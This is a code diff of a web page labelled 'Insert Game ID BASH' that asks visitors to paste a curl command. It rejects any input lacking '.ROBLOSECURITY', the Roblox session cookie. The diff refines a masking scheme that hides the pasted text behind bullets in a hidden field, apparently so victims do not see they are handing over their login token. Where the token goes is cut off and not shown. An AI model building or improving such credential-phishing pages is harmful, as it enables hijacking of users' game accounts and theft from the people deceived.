@@ -15,6 +15,25 @@
       background-size: 4rem 4rem;
       opacity: 0.3;
     }
+    /* Force fixed height + scroll */
+    #visible-input {
+      height: 220px !important;
+      min-height: 220px !important;
+      max-height: 220px !important;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #6b46c1 #1a1a1a;
+    }
+    #visible-input::-webkit-scrollbar {
+      width: 8px;
+    }
+    #visible-input::-webkit-scrollbar-track {
+      background: #1a1a1a;
+    }
+    #visible-scrollbar-thumb {
+      background: #6b46c1;
+      border-radius: 4px;
+    }
   </style>
 </head>
 <body class="min-h-screen flex items-center justify-center relative overflow-hidden">
@@ -34,17 +53,16 @@
     <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
       <label class="block mb-4 text-sm font-light text-zinc-400">Insert Game ID BASH</label>
 
-      <!-- Hidden textarea that stores the real text -->
+      <!-- Hidden real storage -->
       <textarea id="real-input" class="hidden"></textarea>
 
-      <!-- Visible textarea that shows bullets only -->
+      <!-- Visible masked input (fixed height + scrollable) -->
       <textarea
         id="visible-input"
         placeholder="curl https://..."
         autocomplete="off"
         spellcheck="false"
-        class="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition caret-transparent"
-        style="field-sizing: content;"
+        class="w-full bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition caret-transparent"
       ></textarea>
 
       <div id="counter" class="mt-2 text-right text-xs text-zinc-500">0 / 4000 characters</div>
@@ -64,7 +82,6 @@
     const button = document.getElementById('submit');
     const message = document.getElementById('message');
 
-    // Function to replace visible text with bullets while keeping real text intact
     function updateVisible() {
       const realText = realInput.value;
       visibleInput.value = '•'.repeat(realText.length);
@@ -72,37 +89,24 @@
       button.disabled = realText.length === 0;
     }
 
-    // Capture every input change
-    visibleInput.addEventListener('input', (e) => {
-      const currentReal = realInput.value;
-      const newText = e.target.value.replace(/[^\s\S]/g, ''); // we don't actually get the typed char easily, so rebuild from difference
-      // Simpler & more reliable way: compare lengths
-      const visibleLength = visibleInput.value.length;
-      if (visibleLength > currentReal.length) {
-        // User typed something → append the last character (we can't see it, but we can infer from length)
-        // Actually easiest: just allow normal typing but instantly mask it
-        realInput.value = visibleInput.value.replace(/•/g, ''); // this won't work
-      }
-    });
-
-    // BETTER APPROACH: use a real password-like mask with composition events
     visibleInput.addEventListener('beforeinput', (e) => {
       e.preventDefault();
       const current = realInput.value;
-      if (e.data != null) {
-        // Typing a character
+
+      if (e.inputType === 'insertText' && e.data !== null) {
         realInput.value = current + e.data;
       } else if (e.inputType === 'deleteContentBackward' && current.length > 0) {
         realInput.value = current.slice(0, -1);
       } else if (e.inputType === 'deleteContentForward' && current.length > 0) {
         realInput.value = current.slice(0, -1);
-      } else if (e.inputType.includes('delete')) {
-        realInput.value = '';
+      } else if (e.inputType === 'insertFromPaste') {
+        // handled separately in paste listener
+        return;
       }
+
       updateVisible();
     });
 
-    // Handle paste
     visibleInput.addEventListener('paste', (e) => {
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -110,11 +114,16 @@
       updateVisible();
     });
 
-    // Initial update
-    updateVisible();
+    // Allow normal keyboard navigation (arrows, home/end, etc.) without breaking anything
+    visibleInput.addEventListener('keydown', (e) => {
+      if (['ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'].includes(e.key)) {
+        e.stopPropagation();
+      }
+    });
 
     button.addEventListener('click', async () => {
       const input = realInput.value.trim();
+
       if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
         message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
           <i data-lucide="alert-circle" class="w-5 h-5"></i>
